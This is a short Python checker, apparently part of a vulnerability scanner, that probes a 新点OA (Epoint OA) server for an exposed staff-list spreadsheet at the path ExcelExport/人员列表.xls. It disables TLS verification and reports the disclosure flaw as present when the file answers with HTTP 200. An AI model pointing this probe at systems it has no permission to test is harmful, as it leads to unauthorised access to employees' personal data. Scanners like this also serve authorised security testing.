import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging

def 新点OA_Excel_敏感信息泄露(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0",
    }
    plani_url = urldata + 'ExcelExport/人员列表.xls'

    try:
        requests.packages.urllib3.disable_warnings()
        respones1 = requests.get(plani_url, headers=headers, verify=False)
        if respones1.status_code == 200:
            print(Vcolors.RED + "[+] 新点OA ExcelExport 敏感信息泄露漏洞存在{}".format(plani_url) +Vcolors.ENDC)
        else:
            print(Vcolors.WARNING + "[x] 新点OA ExcelExport 敏感信息泄露漏洞不存在" +Vcolors.ENDC)
    except:
        logging.error("启莱新点OA_Excel_敏感信息泄露脚本出现异常")


